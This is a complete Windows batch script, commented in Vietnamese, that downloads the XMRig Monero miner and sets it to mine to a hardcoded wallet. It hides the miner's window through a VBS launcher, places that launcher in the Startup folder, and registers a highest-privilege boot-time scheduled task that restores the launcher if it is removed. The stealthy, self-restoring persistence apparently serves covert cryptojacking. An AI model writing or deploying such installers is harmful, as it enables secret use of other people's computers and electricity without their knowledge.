@echo off
title Cài đặt XMRig AutoRun
setlocal

:: ------------------- Cấu hình -------------------
set WALLET=47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL
set RIG=%COMPUTERNAME%
set INSTALL_DIR=D:\xmrig_autorun
set XMRIG_URL=https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-gcc-win64.zip
:: ------------------------------------------------

echo [+] Tạo thư mục: %INSTALL_DIR%
mkdir "%INSTALL_DIR%"
cd /d "%INSTALL_DIR%"

echo [+] Tải XMRig...
curl -L -o xmrig.zip %XMRIG_URL%
tar -xf xmrig.zip

:: Tìm thư mục vừa giải nén (xmrig-xxx)
for /d %%F in ("xmrig-*") do set XMRIG_DIR=%%F

echo [+] Tạo start.bat...
(
echo @echo off
echo cd /d "%INSTALL_DIR%\%XMRIG_DIR%"
echo start /min xmrig.exe -o pool.supportxmr.com:3333 -u %WALLET% -k --rig-id %RIG%
) > "%INSTALL_DIR%\start.bat"

echo [+] Tạo silent.vbs...
(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run chr(34^) ^& "%INSTALL_DIR%\start.bat" ^& Chr(34^), 0
echo Set WshShell = Nothing
) > "%INSTALL_DIR%\silent.vbs"

echo [+] Tạo copy_to_startup.bat...
(
echo @echo off
echo set VBSFILE=%INSTALL_DIR%\silent.vbs
echo set SHORTCUT=%%APPDATA%%\Microsoft\Windows\Start Menu\Programs\Startup\silent.vbs
echo copy "%%VBSFILE%%" "%%SHORTCUT%%" /Y
) > "%INSTALL_DIR%\copy_to_startup.bat"

echo [+] Copy shortcut silent.vbs vào thư mục Startup...
copy "%INSTALL_DIR%\silent.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\silent.vbs" /Y

echo [+] Tạo Scheduled Task để khôi phục shortcut mỗi khi máy khởi động...
schtasks /Create ^
 /TN "XMRigStartupRestore" ^
 /TR "\"%INSTALL_DIR%\copy_to_startup.bat\"" ^
 /SC ONSTART ^
 /RL HIGHEST ^
 /F

echo.
echo [✔] Hoàn tất! Miner sẽ tự chạy ẩn khi máy khởi động, với tên worker là: %COMPUTERNAME%
pause
